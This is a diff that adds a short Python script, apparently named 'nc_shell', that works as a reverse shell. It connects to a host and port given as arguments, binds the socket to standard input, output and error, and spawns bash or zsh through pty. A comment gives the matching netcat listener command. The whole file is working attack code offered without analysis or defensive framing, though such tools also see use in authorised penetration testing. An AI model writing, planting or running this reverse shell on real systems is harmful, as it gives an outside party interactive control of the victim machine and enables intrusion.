@@ -1,0 +1,22 @@
+#!/usr/bin/env python
+
+import argparse
+import os
+import pty
+import socket
+
+if __name__ == '__main__':
+    # server: nc -l 1234
+    parser = argparse.ArgumentParser(description='nc_shell')
+    parser.add_argument('host', help='host to connect to')
+    parser.add_argument('port', type=int, help='port to connect to')
+    parser.add_argument('-s', '--shell', default='bash', choices=['bash', 'zsh'], help='shell to run')
+    args = parser.parse_args()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((args.host, args.port))
+
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+
+    pty.spawn(f'/bin/{args.shell}')
